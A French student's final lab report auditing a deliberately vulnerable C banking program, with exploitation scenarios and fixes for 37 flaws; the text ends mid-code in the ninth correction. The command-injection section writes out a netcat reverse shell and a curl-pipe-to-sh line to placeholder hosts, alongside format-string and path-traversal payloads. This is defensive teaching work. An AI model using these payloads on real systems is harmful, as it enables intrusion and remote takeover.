# RAPPORT DE SÉCURITÉ - TP FINAL
**Étudiant** : Samuel LACHAND
**Date** : 30/07/2026
**Durée** : 4 heures

---

## TABLE DES MATIÈRES
1. [Synthèse des vulnérabilités](#synthèse)
2. [Corrections détaillées](#corrections)
3. [Tests de validation](#tests)
4. [Conclusion](#conclusion)

---

## 1. SYNTHÈSE DES VULNÉRABILITÉS <a name="synthèse"></a>

Méthode : lecture du fichier de haut en bas, puis passage de la checklist des
consignes (A à G) sur chaque fonction. Les numéros de ligne renvoient à
`vulnerable.c`.

J'ai commencé par regarder la structure `User`, parce que plusieurs débordements
dépendent de l'endroit où tombent les champs. Elle fait 48 octets :

| champ | offset |
|---|---|
| `username[16]` | 0 |
| `password[16]` | 16 |
| `admin_flag` | 32 |
| `balance` | 36 |
| `token` | 40 |

Le débordement de la ligne 230 est donc le plus grave du fichier : la copie
commence à l'offset 16, donc le 17e caractère tombe sur `admin_flag`.

Quand le même défaut apparaît plusieurs fois et se corrige de la même façon, je
l'ai compté une fois en listant toutes les lignes : les quatre `gets()` forment
une entrée, les dix `scanf("%s")` une autre.

### Tableau récapitulatif

| # | Fonction | Ligne(s) | Type | Gravité | Corrigée |
|---|----------|----------|------|---------|----------|
| 1 | `show_profile()`, `system_command()`, `change_password()` | 105, 181, 224, 229 | Buffer overflow : 4 appels à `gets()` | Critique | Oui |
| 2 | 7 fonctions | 61, 64, 67, 117, 139, 160, 192, 258, 329, 331 | Buffer overflow : 10 `scanf("%s")` sans largeur | Haute | Oui |
| 3 | `show_profile()` | 106 | Format string contrôlée par l'utilisateur | Critique | Oui |
| 4 | `system_command()` | 183-184 | Injection de commandes via `system()` | Critique | Oui |
| 5 | `change_password()` | 230 | `strcpy` provoquant l'écrasement de `admin_flag` | Critique | Oui |
| 6 | `register_user()`, `clone_user()` | 72-73, 199-200 | `strcpy` vers des champs de 16 octets | Critique | Oui |
| 7 | `register_user()` | 77-78 | Heap overflow : `malloc(32)` + `sprintf` | Critique | Oui |
| 8 | `register_user()` | 78 | Jeton de session prédictible | Faible | Oui |
| 9 | `register_user()` | 69-74 | L'utilisateur choisit ses droits admin | Critique | Oui |
| 10 | `main()` | 310-311 | Identifiants admin codés en dur | Critique | Oui |
| 11 | `change_password()` | 226-227 | Porte dérobée `master_reset_2024` | Haute | Oui |
| 12 | `struct User` | 21, 73 | Mots de passe stockés en clair | Critique | Oui |
| 13 | `hash_password()` | 39-45 | Hash maison DJB2, sans sel, jamais appelé | Haute | Oui |
| 14 | `backup_user_data()` | 143-147 | Mot de passe écrit en clair sur disque | Haute | Oui |
| 15 | `login_user()` | 88 | `strcmp` : fuite par temps d'exécution | Faible | Oui (bonus) |
| 16 | `main()` | 327-337 | Tentatives de connexion illimitées | Moyenne | Oui (bonus) |
| 17 | `backup_user_data()` | 139-141 | Path traversal en écriture | Critique | Oui |
| 18 | `restore_user_data()` | 160-162 | Path traversal en lecture | Haute | Oui |
| 19 | `main()` case 6 | 360-361 | Restauration accessible sans authentification | Haute | **Non** |
| 20 | `backup_user_data()` | 141-149 | Retours de `fprintf`/`fclose` ignorés | Faible | **Non** |
| 21 | `transfer_money()` | 120-125 | Montant négatif, solde non vérifié | Critique | Oui |
| 22 | `transfer_money()` | 124-125 | Débordement d'entier signé sur `balance` | Moyenne | **Non** |
| 23 | `clone_user()` | 200-202 | Le clone hérite du mot de passe, du flag admin et du solde | Haute | **Non** |
| 24 | `main()` | 318-321 | Boucle infinie sur EOF, retour de `scanf("%d")` non vérifié | Haute | Oui |
| 25 | `register_user()`, `main()` | 77, 314 | `malloc()` sans vérification du retour | Moyenne | Oui |
| 26 | `register_user()`, `main()` | 77, 314, 394 | Aucun `free()`, sortie sans libération | Moyenne | Oui |
| 27 | 6 fonctions | 96, 111, 134, 154, 188, 218 | Indices de tableau reçus jamais validés | Moyenne | **Non** |
| 28 | `register_user()` | 66-67 | Confirmation du mot de passe jamais comparée | Moyenne | **Non** |
| 29 | `register_user()`, `clone_user()` | 72, 199 | Aucun contrôle d'unicité des noms | Moyenne | **Non** |
| 30 | `change_password()` | 229-230 | Aucune politique de mot de passe (vide accepté) | Moyenne | **Non** |
| 31 | `list_users()`, `compute_stats()` | 212, 377, 387 | Soldes et statistiques sans authentification | Moyenne | **Non** |
| 32 | `search_user()` | 261 | Énumération des comptes par sous-chaîne (`strstr`) | Moyenne | **Non** |
| 33 | `compute_stats()` | 247 | Division par zéro si `user_count == 0` | Faible | **Non** |
| 34 | `compute_stats()` | 239 | Débordement d'entier sur le cumul des soldes | Faible | **Non** |
| 35 | `compute_stats()` | 249 | `sprintf()` au lieu de `snprintf()` | Faible | Oui |
| 36 | `cleanup_sessions()` | 268-275 | Code mort : `sessions[]` jamais alimenté | Faible | **Non** |
| 37 | `Makefile` | 6 | `-D_FORTIFY_SOURCE=2` sans `-O` : protection inactive | Moyenne | Oui |

**Total de vulnérabilités identifiées** : **37**
(11 Critiques, 8 Hautes, 11 Moyennes, 7 Faibles)

**Corrigées** : 24 entrées, par 10 correctifs (un seul correctif règle les quatre
`gets()`, un autre les dix `scanf("%s")`).
**Non traitées** : 13 entrées, faute de temps. Elles sont reprises en section 4.3
avec ce que j'aurais fait. J'ai priorisé les 11 Critiques, qui sont toutes
corrigées.

---

## 2. CORRECTIONS DÉTAILLÉES <a name="corrections"></a>

---

### Correction #1 : les 4 `gets()` et les 10 `scanf("%s")`

#### 🔴 Vulnérabilité originale
**Fonction concernée** : `show_profile()`, `system_command()`, `change_password()`, `register_user()`, `transfer_money()`, `backup_user_data()`, `restore_user_data()`, `clone_user()`, `search_user()`, `main()`
**Ligne(s)** : 105, 181, 224, 229 puis 61, 64, 67, 117, 139, 160, 192, 258, 329, 331 (entrées 1 et 2)

**Description** :
```
gets() ne reçoit pas la taille du tampon de destination et lit jusqu'au retour à
la ligne : il n'existe aucune façon sûre de l'appeler, c'est pour ça qu'elle a
été retirée de la norme C11. Elle n'est plus déclarée par le <stdio.h> d'Ubuntu
24.04, donc le fichier ne compile qu'avec -w comme le fait le Makefile fourni.

scanf("%s") a le même défaut : pas de largeur maximale. En plus, les deux
laissent le '\n' dans stdin, et le getchar() de la ligne 321 n'en retire qu'un.
```

**Code vulnérable** :
```c
char format[80];
gets(format);                    /* ligne 105 */

char username[50], password[50];
scanf("%s", username);           /* ligne 329 */
```

#### 💥 Attaque possible
**Scénario d'exploitation** :
```
Se connecter, menu 3, puis saisir 300 caractères 'A' au prompt "Format
d'affichage personnalisé:". format fait 80 octets et c'est le seul tableau local
de la fonction : l'écriture atteint le canari, le pointeur de cadre sauvegardé
et l'adresse de retour de show_profile().

Résultat : *** stack smashing detected ***. Avec une charge construite (bourrage
jusqu'à l'adresse de retour puis adresse d'un gadget), on détourne l'exécution.

J'avais d'abord écrit que le débordement des scanf du menu 2 permettait
d'écraser logged_user et de passer les tests "if(logged_user >= 0)". C'est faux :
ligne 332, logged_user est réaffecté avec le retour de login_user() juste après
les deux saisies, donc la valeur injectée est perdue.
```

**Impact** :
- [x] Exécution de code arbitraire
- [ ] Lecture de mémoire
- [x] Déni de service (crash)
- [ ] Élévation de privilèges
- [ ] Fuite d'informations

#### ✅ Correction implémentée

**Code corrigé** :
```c
int lire_ligne(const char *invite, char *dst, size_t taille) {
    size_t n;
    int c;

    printf("%s", invite);
    fflush(stdout);

    if(fgets(dst, (int)taille, stdin) == NULL) {
        dst[0] = '\0';
        return LECTURE_EOF;
    }
    n = strcspn(dst, "\n");
    if(dst[n] == '\n') {
        dst[n] = '\0';
        return LECTURE_OK;
    }
    while((c = getchar()) != '\n' && c != EOF) { ; }    /* purge du reste */
    printf("Saisie trop longue (%zu caractères maximum)\n", taille - 1);
    return LECTURE_INVALIDE;
}
```

**Modifications effectuées** :
1. Une seule fonction de saisie pour les 14 entrées du programme.
2. `fgets()` reçoit la taille, passée par `sizeof(dst)` et jamais recopiée à la main.
3. Le retour est testé : sur fin de flux, l'appelant s'arrête au lieu d'utiliser
   un tampon non initialisé.
4. Le `\n` final est retiré avec `strcspn`, sinon il ferait partie du nom saisi.
5. Si la ligne était trop longue, le reste de `stdin` est purgé.

#### 🛡️ Justification de sécurité

**Pourquoi cette correction est sûre** :
```
fgets() écrit au plus taille-1 octets puis un '\0', donc le tampon ne peut plus
déborder quelle que soit la saisie.

Les consignes proposent scanf("%15s"). Ça borne bien l'écriture, mais ça tronque
en silence : un nom coupé au 15e caractère pourrait tomber sur celui d'un compte
existant, et le reste de la ligne serait lu comme la saisie suivante. Ici la
ligne trop longue est refusée et stdin est purgé.
```

**Tests effectués** :
```bash
printf '1\nbob\nPassw0rd1\nPassw0rd1\n2\nbob\nPassw0rd1\n3\n' > in.txt
python3 -c "print('A'*300)" >> in.txt ; printf '0\n' >> in.txt
./secure < in.txt
# → Saisie trop longue (79 caractères maximum)      [pas de crash]

printf '1\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n0\n' | ./secure
# → Nom invalide : 3 à 15 caractères, lettres, chiffres et '_'
```

---

### Correction #2 : format string contrôlée par l'utilisateur

#### 🔴 Vulnérabilité originale
**Fonction concernée** : `show_profile()`
**Ligne(s)** : 106 (entrée 3)

**Description** :
```
La saisie est passée comme premier argument de printf(), donc comme chaîne de
format. printf interprète les directives qu'elle contient et va chercher les
arguments correspondants dans les registres puis sur la pile, alors qu'aucun
argument n'a été fourni.
```

**Code vulnérable** :
```c
gets(format);
printf(format);
```

#### 💥 Attaque possible
**Scénario d'exploitation** :
```
Menu 3, puis saisir :  %p %p %p %p %p %p %p %p
→ affiche le contenu de la pile : adresses de la bibliothèque C (contournement
  de l'ASLR), canari, adresses de retour.

Puis :  %49x%8$n
→ %n écrit le nombre d'octets déjà affichés (49) à l'adresse pointée par le 8e
  argument. En plaçant l'adresse de users[0].admin_flag sur la pile via la
  saisie, on obtient les droits administrateur.

La charge "%s %s %s", souvent citée pour lire les mots de passe, ne marche pas
de façon fiable ici : rien ne garantit qu'un pointeur vers users[] soit dans les
arguments variadiques. En pratique on obtient des octets arbitraires ou un
segfault.
```

**Impact** :
- [x] Exécution de code arbitraire
- [x] Lecture de mémoire
- [x] Déni de service (crash)
- [x] Élévation de privilèges
- [x] Fuite d'informations

#### ✅ Correction implémentée

**Code corrigé** :
```c
printf(format);         /* avant */
printf("%s\n", format); /* après */
```

**Modifications effectuées** :
1. La chaîne de format devient un littéral du programme.
2. La saisie devient un simple argument de `%s`.

#### 🛡️ Justification de sécurité

**Pourquoi cette correction est sûre** :
```
Le format est écrit dans le code, l'utilisateur ne peut plus y introduire de
directive. Une saisie contenant "%n" est affichée telle quelle.

C'est la seule correction que le compilateur oblige à faire : gcc active
-Werror=format-security par défaut sur Ubuntu, donc printf(format) est une
erreur de compilation et pas un simple warning. Le code d'origine ne compile pas
sans -w.
```

**Tests effectués** :
```bash
printf '...\n3\n%%p %%p %%p %%n\n0\n' | ./secure
# → Format d'affichage personnalisé: %p %p %p %n     [affiché littéralement]
```

---

### Correction #3 : injection de commandes système

#### 🔴 Vulnérabilité originale
**Fonction concernée** : `system_command()`
**Ligne(s)** : 183-184 (entrée 4)

**Description** :
```
La saisie est concaténée dans une chaîne passée à system(), qui l'exécute via
/bin/sh -c. Le shell interprète les métacaractères : tout ce qui suit un ';',
un '&&' ou un '|' devient une nouvelle commande.
```

**Code vulnérable** :
```c
gets(cmd);
sprintf(full_cmd, "echo 'Exécution:' && %s", cmd);
system(full_cmd);
```

#### 💥 Attaque possible
**Scénario d'exploitation** :
```
Se connecter avec admin/admin123 (lu directement dans le code, lignes 310-311),
menu 7, puis saisir :

  x ; cat /etc/passwd
  x ; nc -e /bin/sh 10.0.0.1 4444
  x ; curl http://serveur/payload.sh | sh

La commande s'exécute avec les droits du processus. Il suffit de trois entrées
de menu depuis le lancement.
```

**Impact** :
- [x] Exécution de code arbitraire
- [ ] Lecture de mémoire
- [ ] Déni de service (crash)
- [x] Élévation de privilèges
- [x] Fuite d'informations

#### ✅ Correction implémentée

**Code corrigé** :
```c
printf("1. Date du système\n2. Espace disque\n0. Annuler\n");
if(lire_entier("Choix: ", 0, 2, &choix) != LECTURE_OK) return;

switch(choix) {
    case 1: r = system("/bin/date"); break;
    case 2: r = system("/bin/df -h"); break;
    default: return;
}
if(r != 0) printf("La commande s'est terminée anormalement\n");
```

**Modifications effectuées** :
1. La saisie libre devient un choix numérique entre commandes fixes.
2. Les chaînes passées à `system()` sont des constantes du programme.
3. Chemins absolus, pour ne pas dépendre de `$PATH` qu'un attaquant pourrait
   modifier pour faire exécuter son propre binaire nommé `date`.
4. Le retour de `system()` est vérifié.

#### 🛡️ Justification de sécurité

**Pourquoi cette correction est sûre** :
```
Il n'y a plus de concaténation : l'utilisateur tape un numéro, et la chaîne
passée à system() est une constante du code. Il n'y a donc plus d'endroit où
insérer un ';'.

J'ai d'abord pensé filtrer les métacaractères (; | & ` $), puis j'ai abandonné :
une liste de caractères interdits se contourne, une liste de commandes
autorisées non. J'aurais aussi pu utiliser fork() + execv(), qui n'appelle pas
de shell du tout ; je ne l'ai pas fait parce que ça rallonge le code et que la
chaîne est déjà constante.
```

**Tests effectués** :
```bash
printf '...\n7\n0\n' | ./secure           # utilisateur non-admin
# → Accès refusé

# en session administrateur, choix 1 :
# → Thu Jul 30 17:39:02 CEST 2026         [aucune saisie libre possible]
```

---

### Correction #4 : `strcpy()` vers les champs de 16 octets

#### 🔴 Vulnérabilité originale
**Fonction concernée** : `change_password()`, `register_user()`, `clone_user()`
**Ligne(s)** : 230, 72-73, 199-200 (entrées 5 et 6)

**Description** :
```
Les champs username et password de la structure font 16 octets. Les tampons
locaux copiés dedans font 30 à 100 octets, et strcpy() copie jusqu'au '\0' sans
tenir compte de la taille de la destination.

Le pire est la ligne 230 : la destination est users[user_id].password, à
l'offset 16 de la structure, et admin_flag est à l'offset 32. 17 caractères
suffisent donc pour écrire dans admin_flag.
```

**Code vulnérable** :
```c
gets(new_pass);                                /* new_pass[80] */
strcpy(users[user_id].password, new_pass);     /* champ de 16 octets */
```

#### 💥 Attaque possible
**Scénario d'exploitation** :
```
1. Menu 1 : créer "bob", mot de passe "x", droits admin = 0.
2. Menu 2 : se connecter en bob.
3. Menu 10 : ancien mot de passe "x", puis comme nouveau mot de passe :

   AAAAAAAAAAAAAAAA1        (16 'A' puis '1', soit 17 caractères)

   strcpy écrit 18 octets depuis l'offset 16 : les octets 17-18 tombent sur
   admin_flag, qui vaut alors 0x31 = 49, donc non nul.
4. Menu 7 : le test users[logged_user].admin_flag est vrai, la commande système
   est accessible.

Le même débordement dans register_user() (ligne 72) ne donne rien : admin_flag,
balance et token sont réécrits juste après, aux lignes 74 à 77.
```

**Impact** :
- [x] Exécution de code arbitraire
- [ ] Lecture de mémoire
- [x] Déni de service (crash)
- [x] Élévation de privilèges
- [ ] Fuite d'informations

#### ✅ Correction implémentée

**Code corrigé** :
```c
/* le champ password disparaît de la structure, cf. correction #5 */
snprintf(users[user_count].username, sizeof(users[user_count].username), "%s", nom);
```
précédé de `nom_valide()`, qui limite déjà à 15 caractères.

**Modifications effectuées** :
1. Toutes les copies passent par `snprintf` avec `sizeof(destination)`.
2. Une validation de longueur précède la copie, la troncature ne peut donc pas
   se produire.
3. Le tampon local de `clone_user()` est dimensionné à la taille du champ de
   destination, sinon gcc signale `-Wformat-truncation`.

#### 🛡️ Justification de sécurité

**Pourquoi cette correction est sûre** :
```
Je n'ai pas utilisé strncpy malgré le tableau des consignes, pour deux raisons :

- strncpy n'écrit pas de '\0' si la source atteint la taille indiquée. Le champ
  resterait non terminé et un printf("%s") continuerait de lire dans le champ
  suivant de la structure.
- à -O2, strncpy(dst, src, sizeof(dst)) déclenche -Wstringop-truncation, ce qui
  empêche d'atteindre les 0 warning demandés.

snprintf garantit toujours la terminaison et renvoie la longueur qu'il aurait
fallu, ce qui permet de détecter la troncature.
```

**Tests effectués** :
```bash
printf '1\nbob\nPassw0rd1\nPassw0rd1\n2\nbob\nPassw0rd1\n10\nPassw0rd1\nAAAAAAAAAAAAAAAA1\n3\nrien\n0\n' | ./secure
# → Mot de passe changé
# → Admin: NON          [admin_flag intact, l'élévation ne marche plus]
```

---

### Correction #5 : mots de passe en clair et hash maison

#### 🔴 Vulnérabilité originale
**Fonction concernée** : `struct User`, `hash_password()`, `login_user()`, `backup_user_data()`
**Ligne(s)** : 21, 39-45, 73, 88, 143-147 (entrées 12, 13, 14)

**Description** :
```
Les mots de passe sont stockés en clair dans char password[16] et comparés avec
strcmp(). Le menu 5 les écrit en clair dans un fichier.

Une fonction hash_password() existe (lignes 39-45) mais n'est jamais appelée :
j'ai cherché, le nom n'apparaît qu'une fois dans tout le fichier. Elle
implémente DJB2, qui produit 32 bits : ce n'est pas une fonction
cryptographique, les collisions se calculent, et il n'y a pas de sel.
```

**Code vulnérable** :
```c
typedef struct {
    char username[16];
    char password[16];
    ...
} User;

unsigned int hash_password(char *pass) {
    unsigned int h = 5381;
    while ((c = *pass++)) h = h * 33 + c;
    return h;
}
```

#### 💥 Attaque possible
**Scénario d'exploitation** :
```
Pas besoin de lire la mémoire du processus : le menu 5 écrit le mot de passe en
clair dans un fichier choisi par l'attaquant, et le menu 6 le relit.

Sur le hash maison, à supposer qu'il ait été utilisé : 32 bits de sortie se
parcourent entièrement en quelques secondes sur un poste ordinaire. Sans sel,
deux comptes ayant le même mot de passe ont le même condensé, donc une table
pré-calculée casse toute la base d'un coup.
```

**Impact** :
- [ ] Exécution de code arbitraire
- [ ] Lecture de mémoire
- [ ] Déni de service (crash)
- [x] Élévation de privilèges
- [x] Fuite d'informations

#### ✅ Correction implémentée

**Code corrigé** :
```c
typedef struct {
    char username[MAX_NOM + 1];
    unsigned char sel[TAILLE_SEL];      /* 16 octets, tiré par RAND_bytes() */
    unsigned char hash[TAILLE_HASH];    /* 32 octets, SHA-256 */
    ...
} User;

void hash_password(const unsigned char *sel, const char *mdp, unsigned char *sortie) {
    unsigned char tampon[TAILLE_SEL + MAX_MDP];
    size_t n = strlen(mdp);

    if(n > MAX_MDP) n = MAX_MDP;
    memcpy(tampon, sel, TAILLE_SEL);
    memcpy(tampon + TAILLE_SEL, mdp, n);
    SHA256(tampon, TAILLE_SEL + n, sortie);
    effacer_memoire(tampon, sizeof(tampon));
}
```

**Modifications effectuées** :
1. DJB2 remplacé par SHA-256 (OpenSSL).
2. Sel aléatoire de 128 bits par compte (bonus « salage »), régénéré à chaque
   changement de mot de passe.
3. Le mot de passe n'est plus stocké : il n'existe que dans un tampon local, le
   temps de la vérification.
4. Le backup n'exporte plus ni le mot de passe, ni le sel, ni le condensé.

#### 🛡️ Justification de sécurité

**Pourquoi cette correction est sûre** :
```
SHA-256 est à sens unique : retrouver le mot de passe depuis le condensé demande
de tester les candidats un par un. Le sel, différent pour chaque compte, rend
les tables arc-en-ciel inutilisables et fait que deux comptes ayant le même mot
de passe ont des condensés différents.

Attention quand même : SHA-256 est une fonction rapide, faite pour l'intégrité,
pas pour stocker des mots de passe. Avec les condensés et un GPU on teste des
milliards de candidats par seconde. Je l'ai utilisé parce que les consignes
l'imposent, mais il faudrait PBKDF2 ou Argon2id (voir section 4.3).

J'ai pris la forme one-shot SHA256() : SHA256_Init/Update/Final sont dépréciés
depuis OpenSSL 3.0 et déclenchent -Wdeprecated-declarations.
```

**Tests effectués** :
```bash
cat backup_moi.txt        # → bob:0:100     [ni mot de passe, ni sel, ni condensé]
strings secure | grep admin123
# → (aucun résultat)
```

---

### Correction #6 : élévation de privilèges et secrets codés en dur

#### 🔴 Vulnérabilité originale
**Fonction concernée** : `register_user()`, `main()`, `change_password()`
**Ligne(s)** : 69-74, 310-311, 226-227 (entrées 9, 10, 11)

**Description** :
```
Trois problèmes qui donnent tous un accès non prévu :

- le formulaire d'inscription demande "Droits admin (1=oui, 0=non)" et recopie
  la réponse dans admin_flag ;
- le compte d'amorçage est admin/admin123, écrit directement dans le code ;
- change_password() accepte la chaîne fixe "master_reset_2024" à la place du
  mot de passe.
```

**Code vulnérable** :
```c
printf("Droits admin (1=oui, 0=non): ");
scanf("%d", &admin);
users[user_count].admin_flag = admin;

strcpy(users[0].password, "admin123");

if(strcmp(users[user_id].password, old_pass) == 0 ||
   strcmp(old_pass, "master_reset_2024") == 0) {
```

#### 💥 Attaque possible
**Scénario d'exploitation** :
```
Élévation : menu 1 → nom "pirate", mot de passe "p", confirmation "p", droits
admin : 1. Puis menu 2, puis menu 7. Trois étapes, aucune compétence technique.

Secrets en dur :
  $ strings vulnerable | grep -E 'admin123|master_reset_2024'
  admin123
  master_reset_2024

Le contrôle d'accès de la ligne 364 ne sert alors plus à rien : le test
users[logged_user].admin_flag est correctement écrit, mais la valeur qu'il teste
a été fournie par l'attaquant lui-même.

La porte dérobée est moins puissante qu'elle n'en a l'air : change_password()
n'est appelée qu'avec logged_user (ligne 382), donc elle ne permet de changer
que le mot de passe du compte sur lequel on est déjà authentifié. D'où le
classement en Haute et non en Critique.
```

**Impact** :
- [x] Exécution de code arbitraire
- [ ] Lecture de mémoire
- [ ] Déni de service (crash)
- [x] Élévation de privilèges
- [x] Fuite d'informations

#### ✅ Correction implémentée

**Code corrigé** :
```c
/* la question sur les droits admin est supprimée */
if(creer_compte(username, password, 0, 100) >= 0)
    printf("Utilisateur enregistré!\n");

/* mot de passe admin tiré au hasard, affiché une seule fois */
generer_mdp_aleatoire(mdp_admin, sizeof(mdp_admin));
if(creer_compte("admin", mdp_admin, 1, 10000) < 0) { cleanup(); return 1; }
printf("Compte administrateur : admin / %s\n", mdp_admin);

/* la deuxième condition du if est retirée */
if(!verifier_mdp(user_id, old_pass)) {
    printf("Ancien mot de passe incorrect\n");
    return;
}
```

**Modifications effectuées** :
1. Suppression de la saisie du flag admin.
2. `admin_flag` est un paramètre de `creer_compte()`, fixé dans le code.
3. Mot de passe administrateur aléatoire de 12 caractères, régénéré à chaque
   démarrage.
4. Suppression du mot de passe maître.

#### 🛡️ Justification de sécurité

**Pourquoi cette correction est sûre** :
```
admin_flag n'est plus jamais renseigné à partir d'une saisie. La seule valeur 1
du programme est écrite en dur dans main(), pour le compte d'amorçage. Avec la
correction #4, il ne reste aucun moyen d'obtenir les droits admin depuis le menu.

Le mot de passe admin fait environ 69 bits d'entropie et change à chaque
exécution. Le mot de passe maître, lui, était visible avec strings et on ne
pouvait pas le changer sans recompiler : il n'y avait rien à filtrer, juste les
deux lignes à enlever.
```

**Tests effectués** :
```bash
strings vulnerable | grep -E 'admin123|master_reset_2024'
# → admin123
# → master_reset_2024
strings secure | grep -E 'admin123|master_reset_2024'
# → (aucun résultat)

printf '...\n10\nmaster_reset_2024\n0\n' | ./secure
# → Ancien mot de passe incorrect
```

---

### Correction #7 : path traversal en lecture et en écriture

#### 🔴 Vulnérabilité originale
**Fonction concernée** : `backup_user_data()`, `restore_user_data()`
**Ligne(s)** : 139-141, 160-162 (entrées 17 et 18)

**Description** :
```
Le nom de fichier saisi est passé tel quel à fopen(). Aucun contrôle sur les
séparateurs de chemin ni sur "..", donc l'utilisateur choisit librement le
fichier ouvert : en écriture pour le backup, en lecture pour la restauration.
```

**Code vulnérable** :
```c
char filename[100];
scanf("%s", filename);
fp = fopen(filename, "w");
```

#### 💥 Attaque possible
**Scénario d'exploitation** :
```
Écriture (menu 5) : saisir ../../../home/victime/.ssh/authorized_keys
fopen(..., "w") tronque le fichier cible et y écrit la ligne de backup. Tout
fichier accessible en écriture au processus peut être détruit ou remplacé.
Autres cibles : ~/.bashrc, /etc/cron.d/tache si le programme tourne en root.

Lecture (menu 6) : saisir ../../../etc/passwd
Le contenu est recopié sur la sortie standard.
```

**Impact** :
- [ ] Exécution de code arbitraire
- [ ] Lecture de mémoire
- [x] Déni de service (crash)
- [x] Élévation de privilèges
- [x] Fuite d'informations

#### ✅ Correction implémentée

**Code corrigé** :
```c
int fichier_valide(const char *nom) {
    size_t i, n = strlen(nom);

    if(n < 1 || n > 32) return 0;
    for(i = 0; i < n; i++)
        if(!isalnum((unsigned char)nom[i]) && nom[i] != '_' && nom[i] != '-') return 0;
    return 1;
}
```
```c
if(!fichier_valide(nom)) {
    printf("Nom de fichier invalide : lettres, chiffres, '_' et '-' uniquement\n");
    return;
}
snprintf(chemin, sizeof(chemin), "backup_%s.txt", nom);
```

**Modifications effectuées** :
1. Validation par liste blanche : lettres, chiffres, `_` et `-`.
2. Chemin construit avec un préfixe et un suffixe constants.
3. Le retour de `fopen()` est testé.

#### 🛡️ Justification de sécurité

**Pourquoi cette correction est sûre** :
```
Le caractère '.' est refusé, donc ".." est impossible à écrire ; '/' et '\' sont
refusés aussi, donc on ne peut former ni chemin relatif ni chemin absolu.
J'autorise une liste de caractères au lieu d'interdire des motifs : comme ça je
n'ai pas besoin de connaître toutes les façons d'écrire "..".

Le préfixe constant "backup_" est une deuxième barrière : même si la validation
laissait passer quelque chose, le chemin resterait dans le répertoire courant.
```

**Tests effectués** :
```bash
printf '...\n5\n../../etc/passwd\n0\n' | ./secure
# → Nom de fichier invalide : lettres, chiffres, '_' et '-' uniquement
ls -l /etc/passwd                    # date de modification inchangée

printf '6\n../../../etc/passwd\n0\n' | ./secure
# → Nom de fichier invalide
```

---

### Correction #8 : montant de transfert non validé

#### 🔴 Vulnérabilité originale
**Fonction concernée** : `transfer_money()`
**Ligne(s)** : 120-125 (entrée 21)

**Description** :
```
Le montant est lu par scanf("%d") sans vérification du retour, puis appliqué
directement. Rien ne contrôle qu'il est positif ni que le compte émetteur a les
fonds.
```

**Code vulnérable** :
```c
int amount;
scanf("%d", &amount);
users[from_user].balance -= amount;
users[i].balance += amount;
```

#### 💥 Attaque possible
**Scénario d'exploitation** :
```
Menu 4 → destinataire "admin" → montant : -10000

  users[attaquant].balance -= -10000   → +10000
  users[admin].balance     += -10000   → -10000

Le montant négatif inverse le sens du transfert : l'attaquant se sert sur le
compte de sa cible. Aucune authentification supplémentaire n'est demandée.

Sans montant négatif : aucune vérification de solde, un compte à 100 peut
transférer 1000000, son solde devient simplement négatif.

Une chose que j'ai vérifiée et qui ne marche pas : le transfert vers soi-même ne
crée pas d'argent. balance -= amount puis balance += amount sur le même compte
donne le même solde.
```

**Impact** :
- [ ] Exécution de code arbitraire
- [ ] Lecture de mémoire
- [ ] Déni de service (crash)
- [ ] Élévation de privilèges
- [x] Autre : vol de fonds

#### ✅ Correction implémentée

**Code corrigé** :
```c
if(lire_entier("Montant: ", 1, 1000000, &amount) != LECTURE_OK) return;
if(users[from_user].balance < amount) {
    printf("Solde insuffisant\n");
    return;
}
users[from_user].balance -= (int)amount;
users[to_user].balance += (int)amount;
```

**Modifications effectuées** :
1. Intervalle [1, 1000000] imposé par `lire_entier()` : ni négatif, ni nul.
2. Vérification du solde avant l'opération.

#### 🛡️ Justification de sécurité

**Pourquoi cette correction est sûre** :
```
Les deux conditions sont vérifiées avant la moindre écriture. Un compte ne peut
donc pas être débité sans que l'autre soit crédité.

Il reste un cas que je n'ai pas traité : le débordement d'entier sur le compte
crédité (entrée 22 du tableau). Avec la borne à 1000000 par transfert il
faudrait plus de 2000 opérations pour l'atteindre, mais ce n'est pas impossible.
```

**Tests effectués** :
```bash
printf '...\n4\nadmin\n-500\n0\n' | ./secure
# → Valeur invalide (attendu : 1 à 1000000)
printf '...\n4\nadmin\n999999\n0\n' | ./secure
# → Solde insuffisant                  [bob dispose de 100]
```

---

### Correction #9 : gestion mémoire

#### 🔴 Vulnérabilité originale
**Fonction concernée** : `register_user()`, `clone_user()`, `main()`
**Ligne(s)** : 77-78, 199-204, 314, 394 (entrées 7, 8, 25, 26)

**Description** :
```
Un bloc de 32 octets est alloué, puis sprintf() y écrit "TOK_" + un index + '_'
+ le nom d'utilisateur, sans limite. Le nom pouvant faire jusqu'à 99 caractères,
l'écriture dépasse largement le bloc. Le retour de malloc() n'est pas vérifié,
le jeton produit est prévisible, clone_user() ne renseigne pas le champ du tout,
aucun free() n'existe dans le programme, et la sortie se fait par un return au
milieu du switch.
```

**Code vulnérable** :
```c
users[user_count].token = malloc(32);
sprintf(users[user_count].token, "TOK_%d_%s", user_count, username);
...
case 0:
    printf("Au revoir!\n");
    return 0;           /* rien n'est libéré */
```

#### 💥 Attaque possible
**Scénario d'exploitation** :
```
Menu 1 avec un nom de 60 caractères : sprintf écrit environ 67 octets dans un
bloc de 32 et écrase les métadonnées du bloc suivant du tas. Au mieux un abandon
de la glibc ("malloc(): corrupted top size"), au pire une écriture contrôlée
lors d'un free() ultérieur.

Le jeton "TOK_1_bob" est entièrement déductible : l'index et le nom sont
affichés par le menu 9. Sans conséquence ici, le champ n'étant jamais relu, mais
le nom "token" indique un usage d'authentification.

La fuite est limitée à 20 × 32 octets puisque MAX_USERS vaut 20, donc l'impact
réel est faible. Dans un service qui tourne en continu, la même erreur finirait
par épuiser la mémoire.
```

**Impact** :
- [x] Exécution de code arbitraire
- [ ] Lecture de mémoire
- [x] Déni de service (crash)
- [ ] Élévation de privilèges
- [x] Autre : fuite mémoire, jeton prévisible

#### ✅ Correction implémentée

**Code corrigé** :
```c
char *generer_token(void) {
    static const char hex[] = "0123456789abcdef";
    unsigned char alea[16];
    char *token = malloc(TAILLE_TOKEN);     /* 33 = 32 hexa + '\0' */
    int i;

    if(token == NULL) return NULL;
    if(RAND_bytes(alea, (int)sizeof(alea)) != 1) { free(token); return NULL; }
    for(i = 0; i < 16; i++) {
        token[i * 2] = hex[alea[i] >> 4];
        token[i * 2 + 1] = hex[alea[i] & 0x0F];
    }
    token[TAILLE_TOKEN - 1] = '\0';
    return token;
}

void cleanup(void) {
    for(i = 0; i < MAX_USERS; i++) {
        free(users[i].token);
        users[i].token = NULL;
        effacer_memoire(users[i].sel, TAILLE_SEL);
